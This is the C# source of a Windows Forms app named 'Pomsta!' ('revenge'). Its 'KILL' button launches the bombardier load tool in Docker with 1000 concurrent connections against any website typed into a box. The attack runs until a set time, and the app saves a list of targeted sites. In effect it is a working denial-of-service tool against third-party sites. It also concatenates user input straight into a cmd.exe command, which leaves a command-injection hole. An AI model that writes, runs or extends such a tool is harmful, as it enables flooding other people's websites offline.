using System.ComponentModel;
using System.Diagnostics;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Runtime;
using System.Security.Permissions;
using System.Drawing.Text;
using System.Drawing;
using System.Text.RegularExpressions;

namespace pomsta
{
    public partial class Form1 : Form
    {

        BindingList<string> sites;

        int hour, min;

        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
        private static extern IntPtr AddFontMemResourceEx(IntPtr pbFont, uint cbFont,
            IntPtr pdv, [System.Runtime.InteropServices.In] ref uint pcFonts);

        private PrivateFontCollection fonts = new PrivateFontCollection();

        Font myFont;

        //-- INITIALIZE FORM --
        public Form1()
        {

            string jsonString = "";

            InitializeComponent();
            
            byte[] fontData = Resources.Andika_Regular;

            IntPtr fontPtr = System.Runtime.InteropServices.Marshal.AllocCoTaskMem(fontData.Length);
            
            System.Runtime.InteropServices.Marshal.Copy(fontData, 0, fontPtr, fontData.Length);
            
            uint dummy = 0;
            
            fonts.AddMemoryFont(fontPtr, Resources.Andika_Regular.Length);
            
            AddFontMemResourceEx(fontPtr, (uint)Resources.Andika_Regular.Length, IntPtr.Zero, ref dummy);
            
            System.Runtime.InteropServices.Marshal.FreeCoTaskMem(fontPtr);

            myFont = new Font(fonts.Families[0], 9.0F);

            this.Font = myFont;

            if (File.Exists("data.json"))
                jsonString = File.ReadAllText("data.json");

            if (jsonString.Length != 0)
                sites = new BindingList<string>(JsonSerializer.Deserialize<List<string>>(jsonString));

            else
            {

                Console.WriteLine("test");
                sites = new BindingList<string>();

            }

            comboBox1.DataSource = sites;

        }

        //-- ACTIONS ON 'KILL' BUTTON CLICKED --

        private async void onButton1Clicked(object sender, EventArgs e)
        {

            DateTime time = DateTime.Now;

            hour = Convert.ToInt32(hourNUD.Value);
            min = Convert.ToInt32(minNUD.Value);

            Regex site = new Regex(@"[a-z]+\.[a-z]+(/?.*)*|[a-z]+\.[a-z]+\.[a-z](/?.*)*");

            if (site.IsMatch(comboBox1.Text) && hour * 3600 + min * 60 > time.Hour * 3600 + time.Minute * 60)
            {

                cmd(String.Format("docker run --name pomsta -ti --rm alpine/bombardier -c 1000 -d {0}s -l https://{1}", (hourNUD.Value - time.Hour) * 3600 + (minNUD.Value - time.Minute) * 60, comboBox1.Text));

                this.Text = "Pomsta! - running";

                if (!sites.Contains(comboBox1.Text))
                {

                    sites.Add(comboBox1.Text);

                    comboBox1.SelectedIndex = comboBox1.Items.Count - 1;

                }

                backgroundWorker1.RunWorkerAsync();

                button1.Enabled = false;
                button2.Enabled = true;

                serialize();

            }
        }

        //-- ACTIONS ON 'STOP' BUTTON CLICKED --

        private void onButton2Clicked(object sender, EventArgs e)
        {

            DateTime time = DateTime.Now;

            cmd("docker stop pomsta");

            backgroundWorker1.CancelAsync();

            finishWork();

        }

        //-- SERIALIZE (SAVE) DATA --

        private void serialize()
        {

            string jsonSerialize = JsonSerializer.Serialize(sites.ToList());

            File.WriteAllText("data.json", jsonSerialize);

        }

        //-- DO WORK BY BACKGROUND WORKER --

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            var backgroundWorker = sender as BackgroundWorker;

            int startTime = DateTime.Now.Hour * 3600 + DateTime.Now.Minute * 60 + DateTime.Now.Second;
            int currentTime = DateTime.Now.Hour * 3600 + DateTime.Now.Minute * 60 + DateTime.Now.Second;

            while (currentTime < hour * 3600 + min * 60)
            {

                currentTime = DateTime.Now.Hour * 3600 + DateTime.Now.Minute * 60 + DateTime.Now.Second;

                double progress = (currentTime - startTime) * 100.0 / (hour * 3600 + min * 60 - startTime);

                backgroundWorker.ReportProgress((int) progress);

                if (backgroundWorker.CancellationPending) break;

                Thread.Sleep(1000);
            
            }
        }

        //-- UPDATE PROGRESS BAR IF PROGRESS CHANGED --

        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
        }

        //-- CHANGE CONTROLS IF BACKGROUND WORK COMPLETED --

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {

            finishWork();

        }

        private void finishWork()
        {

            progressBar1.Value = 0;

            button1.Enabled = true;
            button2.Enabled = false;

            this.Text = "Pomsta!";

        }

        //-- EXECUTE COMMAND PROMPT COMMANDS --

        private void cmd(String cmd)
        {

            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();

            startInfo.CreateNoWindow = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + cmd;

            process.StartInfo = startInfo;
            process.Start();

        }
    }
}